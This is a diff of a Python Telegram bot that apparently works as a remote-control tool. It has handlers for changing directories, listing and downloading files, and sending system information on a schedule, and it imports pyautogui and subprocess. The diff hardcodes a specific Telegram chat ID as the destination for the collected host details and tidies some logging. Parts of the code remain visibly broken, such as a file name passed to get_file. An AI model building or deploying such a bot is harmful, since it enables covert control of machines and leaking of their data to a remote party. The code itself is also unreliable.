@@ -5,10 +5,10 @@ import subprocess
 import pyautogui
 import datetime
 import platform
-import socket
-import os
 import json
 import logging
+import os
+import socket
 
 # Set up logging
 file_name = "app.log"
@@ -37,10 +37,10 @@ def cd(update, context):
         to_change_dir = update.message.text[len('/cd '):]
         os.chdir(to_change_dir)
         update.message.reply_text(f"Command executed successfully:")
-        logging.debug(f"dir has been changed to {os.pwd()}")
+        logging.debug(f"dir has been changed to {os.getcwd()}")
     except Exception as E:
         update.message.reply_text(E)
-        logging.error(e)
+        logging.error(E)
 
 
 def ls(update, context):
@@ -72,7 +72,7 @@ def system_info(context):
 
         # Replace 'YOUR_CHAT_ID' with the actual chat ID where you want to send the message
         context.bot.send_message(
-            chat_id=chat_id, text=info_string)
+            chat_id="5118057698", text=info_string)
     except Exception as e:
         logging.error(e)
 
@@ -183,6 +183,8 @@ def download_file(update, context):
         # Get the file ID from the message
         file_id = update.message.document.file_id
 
+        file_name = update.message.document.file_name
+
         # Get information about the file
         file_info = context.bot.get_file(file_id)
         file_name = context.bot.get_file(file_name)
@@ -192,7 +194,8 @@ def download_file(update, context):
 
         update.message.reply_text(
             f"File downloaded successfully. Path: {file_path} file name: {file_name}")
-        logging.debug()
+        logging.debug(
+            f"File downloaded successfully. Path: {file_path} file name: {file_name}")
 
     except Exception as e:
         logging.error(e)
@@ -277,7 +280,7 @@ def edit_message(update, context):
     except Exception as e:
         update.message.reply_text(f"Error: {e}")
 
-# Main logic and handlers
+# Main handlers
 
 
 updater = telegram.ext.Updater(TOKEN, use_context=True)
